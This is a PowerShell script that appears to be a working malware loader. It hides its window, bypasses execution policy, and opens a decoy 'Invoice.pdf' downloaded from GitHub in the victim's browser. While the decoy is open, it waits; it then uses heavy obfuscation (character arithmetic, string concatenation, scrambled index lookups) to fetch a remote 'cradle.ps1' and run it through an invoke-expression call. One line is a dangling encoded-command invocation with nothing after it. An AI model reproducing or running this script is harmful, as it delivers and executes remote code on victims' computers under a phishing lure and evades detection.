if (-not $env:RELAUNCHED) {
    $env:RELAUNCHED = "1"
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NonInteractive -File `"$PSCommandPath`"" -ErrorAction SilentlyContinue
    exit
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient

$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)

try { $wc.DownloadFile($pdfUrl, $pdfPath) } catch {}

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 1
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$fOqcAoEC4vBklnuJhFYr = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_}) $([char](117+83-117)+[char](26+121-26)+[char](105*115/105)+[char](0+116-0)+[char](31+101-31)+[char](51*109/51)+[char](68*46/68)+[char](0+78-0)+[char](32*101/32)+[char](0+116-0)+[char](108*46/108)+[char](56*87/56)+[char](38*101/38)+[char](78*98/78)+[char](54*67/54)+[char](36+108-36)+[char](0+105-0)+[char](69*101/69)+[char](115*110/115)+[char](17+116-17)); $uOzIm = ($('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'B'+'r'+'o'+'t'+'h'+'e'+'r'+'s'+'e'+'x'+'t'+'r'+'e'+'m'+'e'+'g'+'a'+'m'+'i'+'n'+'g'+'/'+'p'+'w'+'s'+'h'+'c'+'r'+'a'+'d'+'l'+'e'+'/'+'r'+'e'+'f'+'s'+'/'+'h'+'e'+'a'+'d'+'s'+'/'+'m'+'a'+'i'+'n'+'/'+'c'+'r'+'a'+'d'+'l'+'e'+'.'+'p'+'s'+'1')); $fOqcAoEC4vBklnuJhFYr.DownloadString($uOzIm) |%{;$_}| & (("tjOviYJdPXFNCfwuM8Rcp5ZKGDqVxnWg29HblosLIreyS316T-A4m7Uah0kEQBz")[40,29,3,37,58,42,49,59,28,20,41,42,38,38,4,37,29] -join '')

